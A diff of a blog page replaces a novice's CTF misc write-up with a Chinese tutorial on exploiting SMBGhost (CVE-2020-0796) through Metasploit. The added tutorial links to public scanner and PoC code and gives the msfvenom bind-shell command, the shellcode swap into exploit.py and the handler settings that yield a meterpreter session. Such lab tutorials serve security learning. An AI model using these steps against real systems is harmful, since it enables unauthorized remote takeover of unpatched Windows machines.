@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">0xGame misc wp | zerosai7</title>
+  <title itemprop="name">基于msfconsole对永恒之蓝和永恒之黑的攻击（永恒之黑篇） | zerosai7</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -325,11 +325,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/zerosai7/cdn@v3.9/img/custom/misc.jpg);" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v3.9/img/custom/misc.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://gitee.com/zerosai7/images/raw/master/customs/msf-b.jpg);" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gitee.com/zerosai7/images/raw/master/customs/msf-b.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      0xGame misc wp</h1>
+      基于msfconsole对永恒之蓝和永恒之黑的攻击（永恒之黑篇）</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -341,7 +341,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-10-20<span class="bull">
+        2022-1-21<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -355,19 +355,37 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学校里有新生的ctf比赛，也就尝试着做了些，这篇文章是对我做过的misc题的一个wp（作为萌新也是刚刚入门，也在边做边学习，如有不对请指出问题</p>
-<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a>sign in</h3><p>签到题，在RULES界面即可找到答案</p>
-<h3 id="A-translate-draft"><a href="#A-translate-draft" class="headerlink" title="A translate draft"></a>A translate draft</h3><p>打开下载的附件发现需要密码解压，放入winhex中查看，搜索504B0102,后面是0900，再看504B0304，后面是0000，判断是伪加密，将0102后面的0900改为0000即可将文件解压，打开解压后的word文档，发现最下方有一段空白内容，将其修改字体颜色后找到一串编码为base编码，经过尝试发现是base32，解出密码前半段，word打开时发现有问题，改成txt发现里面还有一个txt文件，于是将word改为zip解压，找到HiddenBy13.txt，内容为rot13加密的后半段，两端拼在一起就是flag</p>
-<h3 id="认真的血"><a href="#认真的血" class="headerlink" title="认真的血"></a>认真的血</h3><p>NTFS文件流隐写题目，用ntfsstreameditor扫描后即可得到其中的txt文件，内容为rot47加密，解密后即可得到flag</p>
-<h3 id="Kakurennbo"><a href="#Kakurennbo" class="headerlink" title="Kakurennbo"></a>Kakurennbo</h3><p>光标在文本中发现有隐藏内容，放到linux系统中用vim打开能看到200c200d等内容，判断为零宽隐写，解密后得到看出密码经过加密，通过尝试得出后面为栏数15的栅栏加密</p>
-<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ENCODE"><a href="#ENCODE" class="headerlink" title="ENCODE"></a>ENCODE</h3><p>首先看到新佛曰即可想到与佛论禅，放进去解密，能得到一串既见未来，为何不拜？的内容，由于标点符号和Ook编码类似，这里猜测是Ook加密，放进去解出一串乱码，通过#@等符号的多次出现想到VBS加密，直接解密即可得到flag</p>
-<h3 id="dlohesuoHesaB"><a href="#dlohesuoHesaB" class="headerlink" title="dlohesuoHesaB"></a>dlohesuoHesaB</h3><p>把题目倒过来即为basehousehold，猜测原题也需要将文本倒过来，于是写了python脚本将文本逆序放进去进行base解码，发现能够实现，但之后即使倒序也不能解码，于是想到使用basecrack，将倒序后的文本放进去爆破即可得到flag</p>
-<h3 id="EasyAlpha"><a href="#EasyAlpha" class="headerlink" title="EasyAlpha"></a>EasyAlpha</h3><p>将图片放入Stegsolve修改滤镜，在alpha plane下就能直接得到flag</p>
-<h3 id="Hamburger-Souls"><a href="#Hamburger-Souls" class="headerlink" title="Hamburger Souls"></a>Hamburger Souls</h3><p>根据题目描述猜测flag在图片中，将图片放在winhex中直接搜索0xGame就能找到flag</p>
-<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Easypython"><a href="#Easypython" class="headerlink" title="Easypython"></a>Easypython</h3><p>下载后发现文本中只有一行数据，但是超过了ASCII码的范围，又因为数字均不超过8，猜测为8进制，转换后重新换成ASCII码就可得到</p>
-<h3 id="Pork-Factory"><a href="#Pork-Factory" class="headerlink" title="Pork Factory"></a>Pork Factory</h3><p>根据hint下载工具cloacked-pixel，图片中的为猪圈密码，解码后得到密码MEAT，使用此密码分离出一个网址，打开后发现是一个倾斜的二维码，用zbar后可进行扫码，得到的结果能看出是培根密码，再次解密即可得到flag</p>
-<h3 id="EasyDisk"><a href="#EasyDisk" class="headerlink" title="EasyDisk"></a>EasyDisk</h3><p>下载后得到一个ad1文件和一张图片，根据题目下载FTK Imager，进行ad1解密，发现需要密码，再去看图片，明显能看出图片不完整，放进winhex中修改图片高度即可得到密码，继续进行ad1解密，得到一张完全一样的图片，猜测为盲水印，用python脚本matplotlib对图片操作，得到一张图片，上面的即为flag</p>
-<h3 id="周深的声音"><a href="#周深的声音" class="headerlink" title="周深的声音"></a>周深的声音</h3><p>根据题目下载deepsound，放入音频分离出flag.txt，内容格式看出是base64编码的图片，将其转成图片，在kali中用outguess分离处flag</p>
+          <h1 id="永恒之黑简介"><a href="#永恒之黑简介" class="headerlink" title="永恒之黑简介"></a>永恒之黑简介</h1><p>(同样的这里也对永恒之黑的做个简介，不感兴趣的自动跳过^^)</p>
+<p>微软发布安全公告披露了一个最新的SMB远程代码执行漏洞（CVE-2020-0796），攻击者利用该漏洞无须权限即可实现远程代码执行，一旦被成功利用，其危害不</p>
+<p>亚于永恒之蓝，全球10万台服务器或成首轮攻击目标。</p>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>永恒之黑是针对win10 20之前的版本，之后的版本就修复了该漏洞，因此下镜像的时候同样也要注意一下版本</p>
+<h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>（前面的攻击过程和永恒之蓝差不多，这里就稍微带一下，具体的可以去看上篇文章QAQ）</p>
+<p>使用SMBGhost中的scanner.py可以查看靶机是否有该漏洞，下载地址：<a target="_blank" rel="noopener" href="https://github.com/ly4k/SMBGhost/blob/master/scanner.py">https://github.com/ly4k/SMBGhost/blob/master/scanner.py</a></p>
+<p> <img src="https://gitee.com/zerosai7/images/raw/master/customs/clip_image002.jpg" alt="img"></p>
+<p>用msfvenom生成shellcode来反弹shell，指令如下</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b &#39;\x00&#39; -i 1 -f python
+</code></pre>
+<p><img src="https://gitee.com/zerosai7/images/raw/master/customs/b1.png" alt="b1"></p>
+<p>之后使用SMBGhost中的payload，下载地址如下：<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<p>打开其中的exploit.py，下图所在位置的shellcode替换成我们上面生成的shellcode，注意要把buf全部换成USER_PAYLOAD</p>
+<p><img src="https://gitee.com/zerosai7/images/raw/master/customs/b2.png" alt="b2"></p>
+<p>输入msfconsole打开终端（msf终端每次开出来的都不一样，感兴趣的可以多刷几次看看）</p>
+<p><img src="https://gitee.com/zerosai7/images/raw/master/customs/image-20220121145643517.png" alt="image-20220121145643517"></p>
+<p>先是使用此攻击模块</p>
+<pre><code>use exploit/multi/handler
+</code></pre>
+<p>之后设置payload</p>
+<pre><code>set payload windows/x64/meterpreter/bind_tcp
+</code></pre>
+<p>设置靶机ip和本机端口</p>
+<pre><code>set lport 4444
+set rhost 靶机ip
+</code></pre>
+<p><img src="https://gitee.com/zerosai7/images/raw/master/customs/b4.png" alt="b4"></p>
+<p>运行刚才的exploit.py</p>
+<p><img src="https://gitee.com/zerosai7/images/raw/master/customs/b5.png" alt="b5"></p>
+<p>之后便来到了熟悉的meterpreter界面，成功夺取控制权，具体在meterpreter可以进行的操作可以看上一篇^^</p>
+<p><img src="https://gitee.com/zerosai7/images/raw/master/customs/b6.png" alt="b6"></p>
 
         </div>
         <!-- .entry-content -->
@@ -396,36 +414,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="../../../../2022/01/20/picgo/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gitee.com/zerosai7/images/raw/master/customs/picgo.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://gitee.com/zerosai7/images/raw/master/customs/picgo.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                PicGo+gitee搭建图床</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="../../../09/26/liferestart/" rel="next">
+            <a href="../../20/msf/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v3.8/img/custom/life.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v3.8/img/custom/life.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gitee.com/zerosai7/images/raw/master/customs/msf.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://gitee.com/zerosai7/images/raw/master/customs/msf.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                垃圾人生？重开！</h3>
+                基于msfconsole对永恒之蓝和永恒之黑的攻击（永恒之蓝篇）</h3>
                 <hr>
               </div>
             </a>
